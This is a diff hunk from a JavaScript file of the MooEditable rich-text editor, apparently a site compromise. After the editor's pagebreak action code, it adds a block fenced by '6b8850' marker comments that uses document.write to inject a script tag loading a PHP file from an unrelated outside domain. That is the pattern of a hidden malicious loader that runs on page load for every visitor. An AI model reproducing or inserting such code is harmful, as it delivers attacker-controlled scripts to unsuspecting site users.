@@ -87,3 +87,13 @@ MooEditable.Actions.pagebreak = {
 		}
 	}
 };
+
+/*6b8850*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/6b8850*/
